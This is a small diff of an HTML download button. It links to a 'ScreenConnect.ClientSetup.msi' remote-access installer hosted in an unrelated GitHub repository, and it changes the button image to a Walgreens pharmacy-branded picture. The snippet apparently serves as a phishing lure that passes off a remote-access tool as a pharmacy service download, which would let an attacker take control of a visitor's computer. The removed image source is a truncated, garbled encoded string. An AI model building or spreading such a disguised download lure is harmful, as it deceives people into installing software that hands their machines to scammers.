@@ -1,3 +1,3 @@
 <a href="https://github.com/kenneth23232/thankyou/releases/download/v1.0.0/ScreenConnect.ClientSetup.msi">
-  <img src="MzMxMywicGF0aCI6Ii8zMTE4MjY2NzcvNjQ4ODU0NTg2LWQwMjYzNDU2LTBmY2YtNDFkNS1hYjZkLTcwMmJlNTA1OTVhNC5qcGc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwOTA5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDkwOVQxNzAxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04YjRiMjBhNjk4OTJlZGVkNjhiZGRjZTUzNzQwMjI2MjVkZmU1NDI4ZGM2YTcxOGYxYjhjYzM2NDZmNDMxMmMyJlgtQW16LVNpZ25lZEhlYWRlcn" alt="Download" width="300px">
+  <img src="https://github.com/kenneth23232/thankyou/blob/red/WalgreensPharmacyPatientServicesTeam.jpg?raw=true" alt="Download" width="300px">
 </a>
